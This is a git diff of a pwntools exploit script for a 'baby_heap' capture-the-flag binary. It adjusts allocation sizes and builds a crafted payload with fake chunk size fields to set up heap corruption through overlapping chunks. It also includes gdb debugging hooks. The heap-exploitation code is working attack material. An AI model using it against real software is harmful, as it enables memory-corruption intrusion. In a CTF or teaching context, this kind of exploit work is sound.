@@ -6,6 +6,12 @@
 
 patchelf --set-interpreter /glibc/2.23/64/lib/ld-linux-x86-64.so.2 baby_heap_patched
 patchelf --replace-needed libc.so.6 ./libc.so.6 baby_heap_patched
+
+
+
+
+0x100
+
 """
 
 import re, sys, os.path as path
@@ -32,7 +38,7 @@ def add(size, data):
 def show(index):
     io.sendlineafter(b"> \n", "3")
     io.sendlineafter(b"index\n", str(index))
-    return io.recvuntil("\n1.add\n", drop=True)
+    return io.recvuntil("1.add\n", drop=True)
 
 def delete(index):
     io.sendlineafter(b"> \n", "4")
@@ -41,19 +47,34 @@ def delete(index):
 
 def main():
     add(0x68, "aaaaaaaa\n")  # 0
-    add(0x98, "bbbbbbbb\n")  # 1
-    add(0x100, "eeeeeeee\n")  # 2
-    add(0x10, "xxxxxxxx\n")  # 3
+    add(0x78, "bbbbbbbb\n")  # 1
+    add(0xF0, "eeeeeeee\n")  # 2
+    add(0x10, "xxxxxxxx\n")  # 3  # 防止被top chunk合并
+    
+    
 
     delete(1)
-    add(0x98, flat((
+
+    # if isinstance(io, process):
+    #     gdb.attach(io)
+    #     pause()
+
+
+    add(0x78, flat((
         "@" * 0x10,
-        0, 0x68 | 1,
+        0, 0x60 | 1,
         "#" * (0x70 - 0x20),
-        0x68
+        0x60
     )) + b"a")
+
+    # show(0)
+    # show(1)
+    # show(2)
+    # show(3)
+    # show(4)
+
     if isinstance(io, process):
-        gdb.attach(io, gdbscript="b *0x88888888")
+        gdb.attach(io)
         pause()
 
     delete(2)
